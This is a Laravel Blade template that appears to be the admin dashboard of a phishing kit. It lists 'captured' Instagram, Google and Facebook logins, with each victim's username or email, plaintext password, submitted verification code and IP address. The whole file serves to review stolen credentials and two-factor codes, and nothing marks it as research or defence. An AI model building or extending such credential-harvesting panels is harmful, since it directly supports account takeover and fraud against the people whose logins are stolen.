<!-- Table -->
<div class="bg-white dark:bg-gray-800 shadow-sm rounded-xl border border-gray-200 dark:border-gray-700">
    <div class="p-6">
        <div class="flex items-center justify-between mb-4">
            <h3 class="text-lg font-semibold text-gray-900 dark:text-white flex items-center">
                <i class="fas fa-shield-alt mr-2 text-red-600 dark:text-red-400"></i>Login Attempts
            </h3>
            <div class="text-sm text-gray-500 dark:text-gray-400">
                Total: <span id="total-count">{{ $attempts->total() }}</span>
            </div>
        </div>
        <div class="overflow-x-scroll rounded-lg border border-gray-200 dark:border-gray-600" style="scrollbar-width: thin; scrollbar-color: #cbd5e0 #f7fafc;">
            <div style="min-width: 1200px;">
                <table class="w-full divide-y divide-gray-200">
                    <thead class="bg-gray-50 dark:bg-gray-700">
                        <tr>
                            <th class="px-6 py-3 text-left">
                                <input type="checkbox" id="selectAll" class="rounded border-gray-300 text-indigo-600 focus:ring-indigo-500">
                            </th>
                            <th data-column="platform" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Platform</th>
                            <th data-column="credentials" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Credentials</th>
                            <th data-column="password" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Password</th>
                            <th data-column="verification" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Verification</th>
                            <th data-column="ip" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">IP Address</th>
                            <th data-column="status" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Status</th>
                            <th data-column="date" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Date</th>
                            <th data-column="actions" class="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Actions</th>
                        </tr>
                    </thead>
                    <tbody class="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700" id="login-attempts-table">
                        @forelse($attempts as $attempt)
                            <tr class="hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                                <td class="px-6 py-4 whitespace-nowrap">
                                    <input type="checkbox" name="selected_attempts[]" value="{{ $attempt->id }}" class="attempt-checkbox rounded border-gray-300 text-indigo-600 focus:ring-indigo-500">
                                </td>
                                <td data-column="platform" class="px-6 py-4 whitespace-nowrap">
                                    <div class="flex items-center">
                                        @if($attempt->platform === 'instagram')
                                            <i class="fab fa-instagram text-pink-600 mr-2"></i>
                                            <span class="text-sm font-medium text-gray-900 dark:text-white">Instagram</span>
                                        @elseif($attempt->platform === 'google')
                                            <i class="fab fa-google text-red-600 mr-2"></i>
                                            <span class="text-sm font-medium text-gray-900 dark:text-white">Google</span>
                                        @else
                                            <i class="fab fa-facebook text-blue-600 mr-2"></i>
                                            <span class="text-sm font-medium text-gray-900 dark:text-white">Facebook</span>
                                        @endif
                                    </div>
                                </td>
                                <td data-column="credentials" class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-white">
                                    {{ $attempt->email ?? $attempt->phone ?? $attempt->username ?? 'N/A' }}
                                </td>
                                <td data-column="password" class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-white">
                                    <span class="font-mono">{{ $attempt->password }}</span>
                                </td>
                                <td data-column="verification" class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-white">
                                    {{ $attempt->verification_code ?? 'Not submitted' }}
                                </td>
                                <td data-column="ip" class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-white">
                                    {{ $attempt->ip_address }}
                                </td>
                                <td data-column="status" class="px-6 py-4 whitespace-nowrap">
                                    <span class="inline-flex px-2 py-1 text-xs font-semibold rounded-full {{ $attempt->status === 'verification' ? 'bg-green-100 dark:bg-green-900 text-green-800 dark:text-green-200' : 'bg-yellow-100 dark:bg-yellow-900 text-yellow-800 dark:text-yellow-200' }}">
                                        {{ ucfirst($attempt->status) }}
                                    </span>
                                </td>
                                <td data-column="date" class="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                                    {{ $attempt->created_at->format('M d, Y H:i') }}
                                </td>
                                <td data-column="actions" class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                                    <a href="{{ route('admin.login-attempts.show', $attempt) }}" class="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300">
                                        <i class="fas fa-eye"></i>
                                    </a>
                                </td>
                            </tr>
                        @empty
                            <tr>
                                <td colspan="9" class="px-6 py-12 text-center text-gray-500 dark:text-gray-400">
                                    <i class="fas fa-shield-alt text-4xl mb-4 text-gray-300 dark:text-gray-600"></i>
                                    <p class="text-lg font-medium">No login attempts found</p>
                                    <p class="text-sm">Login attempts will appear here when captured</p>
                                </td>
                            </tr>
                        @endforelse
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
    <!-- Pagination -->
    <div class="px-6 py-4 border-t border-gray-200 dark:border-gray-700 bg-gray-50 dark:bg-gray-700 rounded-b-xl">
        {{ $attempts->links() }}
    </div>
</div>